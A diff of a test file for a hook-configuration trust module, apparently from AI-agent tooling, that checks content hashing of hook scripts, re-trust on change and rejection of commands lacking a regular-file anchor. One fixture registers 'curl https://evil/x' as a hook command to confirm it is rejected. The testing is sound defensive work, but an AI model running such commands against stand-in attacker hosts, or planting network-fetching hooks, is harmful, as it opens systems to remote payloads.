@@ -5,6 +5,7 @@ import {
   existsSync,
   mkdirSync,
   mkdtempSync,
+  realpathSync,
   writeFileSync,
 } from "node:fs";
 import { tmpdir } from "node:os";
@@ -13,7 +14,7 @@ import { cleanupTmpDir } from "../../__tests__/support/tmp-dir-teardown.js";
 import {
   loadHookConfig,
   syntheticConfigHook,
-  resolveScriptAnchors,
+  hashHookCommandFiles,
   trustAnchorKey,
   HOOKS_CONFIG_FILENAME,
 } from "../hook-config-trust.js";
@@ -29,7 +30,7 @@ let layout: HookDirLayout;
 let configPath: string;
 
 beforeEach(() => {
-  tmpDir = mkdtempSync(join(tmpdir(), "hook-config-trust-"));
+  tmpDir = realpathSync(mkdtempSync(join(tmpdir(), "hook-config-trust-")));
   layout = hookDirLayout(tmpDir);
   ({ hooksDir, disabledDir } = layout);
   configPath = join(hooksDir, HOOKS_CONFIG_FILENAME);
@@ -58,28 +59,30 @@ const ALLOW_CONFIG = {
 };
 
 describe("loadHookConfig — composite trust hash", () => {
-  it("binds and hashes the script following an absolute environment launcher", () => {
+  it("hashes a script operand following an absolute environment launcher without rewriting it", () => {
     const launcher = process.platform === "win32" ? writeScript("env.cmd", "fixture launcher") : "/usr/bin/env";
     const script = writeScript("policy.cjs", "module.exports = 'reviewed';");
     writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{ type: "command", command: [launcher, "node", "./policy.cjs"] }] }] } });
     const reviewed = loadHookConfig(configPath);
     expect(reviewed.errors).toEqual([]);
-    expect(reviewed.entries[0].command).toEqual([launcher, "node", script]);
+    expect(reviewed.entries[0].command).toEqual([launcher, "node", "./policy.cjs"]);
+    expect(reviewed.entries[0].fileDependencies).toContain(realpathSync(script));
     writeFileSync(script, "module.exports = 'changed';");
     expect(loadHookConfig(configPath).trustHash).not.toBe(reviewed.trustHash);
   });
 
-  it("binds and hashes the script following an absolute interpreter", () => {
+  it("hashes a script operand following an absolute interpreter without rewriting it", () => {
     const script = writeScript("policy.cjs", "module.exports = 'reviewed';");
     writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{ type: "command", command: [process.execPath, "./policy.cjs"] }] }] } });
     const reviewed = loadHookConfig(configPath);
     expect(reviewed.errors).toEqual([]);
-    expect(reviewed.entries[0].command).toEqual([process.execPath, script]);
+    expect(reviewed.entries[0].command).toEqual([process.execPath, "./policy.cjs"]);
+    expect(reviewed.entries[0].fileDependencies).toContain(realpathSync(script));
     writeFileSync(script, "module.exports = 'changed';");
     expect(loadHookConfig(configPath).trustHash).not.toBe(reviewed.trustHash);
   });
 
-  it("binds and hashes both scripts while preserving a slash-containing option", () => {
+  it("hashes both script operands while preserving a slash-containing option", () => {
     const first = writeScript("first.cjs", "first reviewed");
     const second = writeScript("second.cjs", "second reviewed");
     const output = `--output=${join(tmpDir, "result.json")}`;
@@ -87,7 +90,8 @@ describe("loadHookConfig — composite trust hash", () => {
     writeJsonConfig(configPath, config(output));
     const reviewed = loadHookConfig(configPath);
     expect(reviewed.errors).toEqual([]);
-    expect(reviewed.entries[0].command).toEqual(["node", first, second, output]);
+    expect(reviewed.entries[0].command).toEqual(["node", "./first.cjs", "./second.cjs", output]);
+    expect(reviewed.entries[0].fileDependencies).toEqual([realpathSync(first), realpathSync(second)]);
     writeFileSync(first, "first changed");
     expect(loadHookConfig(configPath).trustHash).not.toBe(reviewed.trustHash);
     writeFileSync(first, "first reviewed");
@@ -98,7 +102,7 @@ describe("loadHookConfig — composite trust hash", () => {
     expect(loadHookConfig(configPath).trustHash).not.toBe(reviewed.trustHash);
   });
 
-  it("binds and hashes an additional parent-relative script", () => {
+  it("hashes an additional parent-relative script without rewriting it", () => {
     const first = writeScript("first.cjs", "first reviewed");
     const helper = join(tmpDir, "helper.cjs");
     writeFileSync(helper, "helper reviewed");
@@ -107,26 +111,31 @@ describe("loadHookConfig — composite trust hash", () => {
     }] }] } });
     const reviewed = loadHookConfig(configPath);
     expect(reviewed.errors).toEqual([]);
-    expect(reviewed.entries[0].command).toEqual(["node", first, helper]);
+    expect(reviewed.entries[0].command).toEqual(["node", "./first.cjs", "../helper.cjs"]);
+    expect(reviewed.entries[0].fileDependencies).toEqual([realpathSync(first), realpathSync(helper)]);
     writeFileSync(helper, "helper changed");
     expect(loadHookConfig(configPath).trustHash).not.toBe(reviewed.trustHash);
   });
 
-  it("rejects a command whose operands establish no explicit script anchor", () => {
+  it("accepts an existing nested operand without path-shape guessing", () => {
+    mkdirSync(join(hooksDir, "scripts"));
+    const script = writeScript("scripts/policy.cjs", "module.exports = {};\n");
     writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{
       type: "command", command: ["node", "scripts/policy.cjs"],
     }] }] } });
     const loaded = loadHookConfig(configPath);
-    expect(loaded.errors).toContainEqual(expect.stringContaining("requires an absolute, ./ or ../ script anchor"));
-    expect(loaded.entries).toEqual([]);
+    expect(loaded.errors).toEqual([]);
+    expect(loaded.entries[0].command).toEqual(["node", "scripts/policy.cjs"]);
+    expect(loaded.entries[0].configDir).toBe(hooksDir);
+    expect(loaded.entries[0].fileDependencies).toEqual([realpathSync(script)]);
   });
 
-  it.each(["missing", "unreadable"])("rejects a %s script anchor instead of trusting a partial definition", async (failure) => {
+  it.each(["missing", "nonregular"])("rejects a %s executable anchor instead of trusting a partial definition", async (failure) => {
     const script = join(hooksDir, "policy.cjs");
-    if (failure === "unreadable") mkdirSync(script);
-    writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{ type: "command", command: [process.execPath, "./policy.cjs"] }] }] } });
+    if (failure === "nonregular") mkdirSync(script);
+    writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{ type: "command", command: ["./policy.cjs"] }] }] } });
     const loaded = loadHookConfig(configPath);
-    expect(loaded.errors).toContainEqual(expect.stringMatching(/script anchor.*cannot be resolved or read/u));
+    expect(loaded.errors).toContainEqual(expect.stringMatching(/file operand 0 cannot be resolved or read|hook executable is not a regular file/u));
     expect(loaded.entries).toEqual([]);
     expect((await acceptHookTrust(HOOKS_CONFIG_FILENAME, layout)).ok).toBe(false);
     const boot = await runHookTrustWorkflow({ ...layout, promptDispatcher: {
@@ -166,7 +175,7 @@ describe("loadHookConfig — composite trust hash", () => {
     expect(h1).not.toBe(h2);
   });
 
-  it("binary-only commands are rejected at parse → no runnable entries", () => {
+  it("commands with no existing regular-file anchor supply no runnable entries", () => {
     writeJsonConfig(configPath, {
       version: 1,
       hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "curl https://evil/x" }] }] },
@@ -174,22 +183,30 @@ describe("loadHookConfig — composite trust hash", () => {
     const loaded = loadHookConfig(configPath);
     expect(loaded.entries).toHaveLength(0);
     expect(loaded.errors.length).toBeGreaterThan(0);
-    expect(loaded.errors[0]).toContain("PATH-binary");
+    expect(loaded.errors[0]).toContain("no regular-file trust anchor");
   });
 
-  it("resolves every explicit script anchor while leaving ordinary operands alone", () => {
-    expect(resolveScriptAnchors(["./a.sh"])).toEqual(["./a.sh"]);
-    expect(resolveScriptAnchors(["python3", "./p.py", "../helper.py"])).toEqual(["./p.py", "../helper.py"]);
-    expect(resolveScriptAnchors(["curl", "https://x", "data/input.json", "application/json"])).toEqual([]);
+  it("hashes every existing regular-file operand and leaves nonfiles as definition arguments", () => {
+    const first = writeScript("first.cjs", "first reviewed");
+    const second = writeScript("second.cjs", "second reviewed");
+    const command = ["node", "first.cjs", "second.cjs", "missing.cjs", "application/json"];
+    const reviewed = hashHookCommandFiles(command, hooksDir);
+    expect(reviewed.errors).toEqual([]);
+    expect(reviewed.files).toEqual([realpathSync(first), realpathSync(second)]);
+    expect(hashHookCommandFiles([...command, "plain text"], hooksDir).hash).not.toBe(reviewed.hash);
+    writeFileSync(second, "second changed");
+    expect(hashHookCommandFiles(command, hooksDir).hash).not.toBe(reviewed.hash);
   });
 
-  it.each([{ prefix: ["./policy.sh"] }, { prefix: ["sh", "./policy.sh"] }])("binds explicit script anchors in $prefix and preserves ordinary argv", ({ prefix }) => {
+  it.each([{ prefix: ["./policy.sh"] }, { prefix: ["sh", "./policy.sh"] }])("binds only the executable in $prefix and preserves ordinary argv", ({ prefix }) => {
     writeScript("policy.sh", "#!/bin/sh\nexit 0\n");
     const ordinary = [`--output=${join(tmpDir, "result.json")}`, "--relative=./reports/out.json", "data/input.json", "application/json", "https://example.com/check"];
     writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{ type: "command", command: [...prefix, ...ordinary] }] }] } });
     const loaded = loadHookConfig(configPath);
     expect(loaded.errors).toEqual([]);
-    expect(loaded.entries[0].command).toEqual([...prefix.slice(0, -1), join(hooksDir, "policy.sh"), ...ordinary]);
+    const executable = prefix[0] === "./policy.sh" ? join(hooksDir, "policy.sh") : prefix[0];
+    expect(loaded.entries[0].command).toEqual([executable, ...prefix.slice(1), ...ordinary]);
+    expect(loaded.entries[0].configDir).toBe(hooksDir);
   });
 
   it("does not mistake an option value for the script anchor", () => {
@@ -197,9 +214,9 @@ describe("loadHookConfig — composite trust hash", () => {
     const option = `--output=${join(tmpDir, "result.json")}`;
     writeJsonConfig(configPath, { hooks: { PreToolUse: [{ hooks: [{ type: "command", command: ["sh", option, "./policy.sh"] }] }] } });
     const loaded = loadHookConfig(configPath);
-    expect(loaded.entries[0].command).toEqual(["sh", option, join(hooksDir, "policy.sh")]);
-    expect(resolveScriptAnchors(loaded.entries[0].command)).toEqual([join(hooksDir, "policy.sh")]);
-    expect(resolveScriptAnchors(["sh", option])).toEqual([]);
+    expect(loaded.entries[0].command).toEqual(["sh", option, "./policy.sh"]);
+    expect(loaded.entries[0].fileDependencies).toEqual([realpathSync(join(hooksDir, "policy.sh"))]);
+    expect(hashHookCommandFiles(["sh", option], hooksDir).errors).toContain("command has no regular-file trust anchor");
   });
 
   it("requires re-trust when a non-path argument changes", async () => {
